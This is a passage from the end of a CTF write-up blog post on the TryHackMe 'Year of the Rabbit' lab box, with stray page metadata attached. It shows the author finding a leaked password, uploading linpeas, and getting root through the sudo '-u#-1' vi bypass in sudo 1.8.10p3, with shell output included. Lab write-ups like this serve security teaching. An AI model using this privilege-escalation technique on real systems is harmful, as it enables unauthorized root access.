gwendoline 46 Jan 23 2020 user.txt\nNow, they do mention some common secret place in the message when we first loggied in.\neli@year-of-the-rabbit:~$ locate s3cr3t /usr/games/s3cr3t /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly! /var/www/html/sup3r_s3cr3t_fl4g.php GG.\neli@year-of-the-rabbit:~$ cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly! Your password is awful, Gwendoline. It should be at least 60 characters long! Not just {brrrrrrrrrrrr} Honestly! Yours sincerely -Root lmao. okay, back to business. Logging as her, we get:\ngwendoline@year-of-the-rabbit:~$ cat user.txt THM{pwned} Priv Esc So we have\ngwendoline@year-of-the-rabbit:/$ sudo -l Matching Defaults entries for gwendoline on year-of-the-rabbit: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User gwendoline may run the following commands on year-of-the-rabbit: (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt We can access user.txt using vi for some reason. The issue is, it says everyone except root can make it work. So \u0026hellip; can\u0026rsquo;t really do anything.\nAt this point, linpeas looks like it could help. So, I\u0026rsquo;ll scp that file to the machine.\n❯ scp linpeas.sh gwendoline@10.10.186.25:~ gwendoline@10.10.186.25's password: linpeas.sh 100% 313KB 188.9KB/s 00:01 I\u0026rsquo;ll let it run in the background. So I did not find anything much interesting, except exim4 that it marked in red. Going up, we have:\n[+] Sudo version [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version Sudo version 1.8.10p3 Very nice. So we have the exploit.\ngwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt root@year-of-the-rabbit:/home/gwendoline# whoami root When you are in vi, go in the command more by pressing : and then run the command !/bin/bash\nroot@year-of-the-rabbit:/# locate *.txt ... /root/root.txt ... root@year-of-the-rabbit:/# cat /root/root.txt THM{l33t} PWNED!\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/EKb6pFE.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-year-of-the-rabbit-writeup/","title":"TryHackMe: Year Of The Rabbit Writeup"}]